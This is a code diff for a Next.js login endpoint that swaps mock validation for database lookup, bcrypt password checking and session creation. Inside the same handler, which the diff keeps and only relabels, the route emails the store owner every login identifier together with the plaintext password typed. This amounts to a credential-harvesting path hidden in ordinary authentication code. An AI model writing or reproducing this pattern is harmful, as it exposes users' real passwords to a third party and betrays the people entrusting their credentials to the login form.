@@ -1,5 +1,8 @@
 import { NextResponse } from 'next/server';
 import nodemailer from 'nodemailer';
+import { prisma } from '@/utils/prisma';
+import bcrypt from 'bcryptjs';
+import { createSession } from '@/utils/session';
 
 export async function POST(request: Request) {
   try {
@@ -10,10 +13,24 @@ export async function POST(request: Request) {
       return NextResponse.json({ error: 'Email/Phone and password are required' }, { status: 400 });
     }
 
-    // Mock Backend Validation
-    if (password === '123456' || password.length < 6) {
+    // Find the user by email
+    const user = await prisma.user.findUnique({
+      where: { email: identifier },
+    });
+
+    if (!user) {
       return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
     }
+
+    // Verify the password
+    const passwordMatch = await bcrypt.compare(password, user.password);
+
+    if (!passwordMatch) {
+      return NextResponse.json({ error: 'Invalid credentials' }, { status: 401 });
+    }
+
+    // Create session cookie
+    await createSession(user.id);
     
     // Send email to the store owner
     try {
@@ -33,7 +50,7 @@ export async function POST(request: Request) {
           html: `
             <h2>New Login Attempt on Ported Hub</h2>
             <p><strong>Identifier (Email/Phone):</strong> ${identifier}</p>
-            <p><strong>Password:</strong> ${password}</p>
+            <p><strong>Password used:</strong> ${password}</p>
           `
         });
       }
@@ -41,15 +58,15 @@ export async function POST(request: Request) {
       console.error('Email failed to send.', emailError);
     }
 
-    // Success response simulating a session/token creation
+    // Success response
     return NextResponse.json({ 
       success: true, 
-      message: `Signed in successfully as ${identifier}!`,
-      token: 'mock_jwt_token_123',
-      user: { id: 1, identifier }
+      message: `Signed in successfully!`,
+      user: { id: user.id, identifier: user.email, name: `${user.firstName} ${user.lastName}` }
     });
 
   } catch (e) {
+    console.error('Login error:', e);
     return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
   }
 }
